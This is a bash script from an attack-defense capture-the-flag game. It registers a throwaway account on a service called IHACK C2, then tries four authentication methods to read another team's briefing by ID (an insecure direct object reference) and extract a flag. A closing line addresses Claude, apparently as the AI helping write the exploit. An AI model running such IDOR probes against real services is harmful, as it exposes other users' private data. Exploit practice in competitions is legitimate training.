#!/usr/bin/env bash
# IHACK C2 (port 8043) IDOR + auth-method probe.
# Registers a throwaway account, prints the register response, then reads a
# victim briefing FOUR ways to find which auth the service accepts. Whichever
# prints a flag is the method the real exploit must use.
#
# Usage:
#   ./attack/test_ihackc2.sh <IP> <brief_id> [note_id]
#   ./attack/test_ihackc2.sh                 # team-14 example
set -uo pipefail

IP="${1:-10.80.14.2}"
BRIEF="${2:-a2319bef-0c2c-450c-adb5-af1f393bcebf}"
NOTE="${3:-58904052-869e-4caa-b506-1f5a8a81bb4d}"
B="http://$IP:8043"
CJ="$(mktemp)"
FLAG_RE='[A-Z0-9]{31}='

echo "[*] target $B"
echo "[*] register response:"
REG="$(curl -s -c "$CJ" -X POST "$B/api/auth/register" \
  -H 'Content-Type: application/json' \
  -d "{\"username\":\"zz$RANDOM$RANDOM\",\"password\":\"x\",\"callsign\":\"zz\"}")"
echo "    $REG"

TOKEN="$(printf '%s' "$REG" | python3 -c 'import sys,json
try: print(json.load(sys.stdin).get("token",""))
except Exception: print("")' 2>/dev/null)"
echo "[*] token = ${TOKEN:-<none>}"
echo "[*] cookie jar:"; sed -n 's/^/    /p' "$CJ" 2>/dev/null | grep -i c2 || echo "    (no c2 cookies)"
echo

try() {  # name  curl-args...
  local name="$1"; shift
  local out; out="$(curl -s "$@" "$B/api/briefings/$BRIEF")"
  local hit; hit="$(printf '%s' "$out" | grep -Eo "$FLAG_RE" | head -1)"
  if [[ -n "$hit" ]]; then
    echo "[+] $name  ->  FLAG: $hit"
  else
    echo "[-] $name  ->  $out"
  fi
}

echo "[*] trying each auth method against /api/briefings/$BRIEF :"
try "A cookie-jar      " -b "$CJ"
try "B Authorization:Bearer" -H "Authorization: Bearer $TOKEN"
try "C Authorization:raw " -H "Authorization: $TOKEN"
try "D Cookie c2_session " -H "Cookie: c2_session=$TOKEN"

rm -f "$CJ"
echo
echo "Whichever line shows FLAG is the auth method. Tell Claude the letter"
echo "(and if none hit, paste the register response above)."
